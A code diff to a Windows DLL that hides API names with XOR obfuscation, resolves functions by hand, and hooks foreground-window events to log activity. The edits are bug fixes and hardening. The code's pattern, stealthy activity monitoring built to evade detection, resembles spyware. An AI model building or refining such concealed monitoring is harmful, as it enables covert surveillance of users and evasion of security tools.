@@ -8,7 +8,7 @@
 #define HEX_K 0xFF
 #define X_C(c) static_cast<char>((c) ^ HEX_K)
 ///////////////////////////////////////////////////////////////////////
-HMODULE hUser32,hkernel32, hPsapi;
+HMODULE hUser32, hkernel32, hPsapi;
 HWINEVENTHOOK hk;
 std::vector<std::string>* sharedLogVector = nullptr;
 std::mutex logMutex;
@@ -52,7 +52,9 @@ void* FindExportAddress(HMODULE hModule, const char* funcName)
 
         }
     }
-    MessageBoxA(NULL, "Failed to find export address" , "Error", MB_OK);
+    std::string errorMsg = "Failed to find export address for function: ";
+    errorMsg += funcName;
+    MessageBoxA(NULL, errorMsg.c_str(), "Error", MB_OK);
     return nullptr;
 }
 
@@ -82,9 +84,9 @@ DLL_EXPORT void Initialize(std::vector<std::string>* logVector)
     for (int i = 0; obf_Cls_Hnd[i] != '\0'; i++) obf_Cls_Hnd[i] ^= HEX_K;
 
 
-    HMODULE hUser32 = (HMODULE)LoadLibraryA(obf_Usr_32);
-    HMODULE hkernel32 = (HMODULE)LoadLibraryA(obf_Ker_32);
-    HMODULE hPsapi = (HMODULE)LoadLibraryA(obf_Papi);
+    hUser32 = (HMODULE)LoadLibraryA(obf_Usr_32);
+    hkernel32 = (HMODULE)LoadLibraryA(obf_Ker_32);
+    hPsapi = (HMODULE)LoadLibraryA(obf_Papi);
     My_Set_WinDows_Huk = (Set_WinHuk_Fn)FindExportAddress(hUser32, obf_Set_Win_Evnt_Huk);
     My_Unhuk_WinDows_Huk = (Un_huk_WinHuk_Fn)FindExportAddress(hUser32, obf_Unhuk_Win_Huk);
     My_Get_Win_Thrd_Proc_Id = (Get_Win_Thrd_Proc_Id_Fn)FindExportAddress(hUser32, obf_Get_Win_Thrd_Proc_Id);
@@ -94,7 +96,11 @@ DLL_EXPORT void Initialize(std::vector<std::string>* logVector)
     My_ClsHnd = (Cls_Hnd_Fn)FindExportAddress(hkernel32, obf_Cls_Hnd);
 
 
-    sharedLogVector = logVector;
+    {
+        std::lock_guard<std::mutex> lock(logMutex);
+        sharedLogVector = logVector;
+    }
+
     hk = My_Set_WinDows_Huk(EVENT_SYSTEM_FOREGROUND, EVENT_SYSTEM_FOREGROUND, NULL, WinEventProc, 0, 0, WINEVENT_OUTOFCONTEXT);
 }
 
@@ -103,9 +109,9 @@ DLL_EXPORT void Cleanup()
     if (hk && My_Unhuk_WinDows_Huk)
     {
         My_Unhuk_WinDows_Huk(hk);
-        FreeLibrary(hUser32);
-        FreeLibrary(hkernel32);
-        FreeLibrary(hPsapi);
+        if (hUser32) FreeLibrary(hUser32);
+        if (hkernel32) FreeLibrary(hkernel32);
+        if (hPsapi) FreeLibrary(hPsapi);
         hk = nullptr;
     }
 }
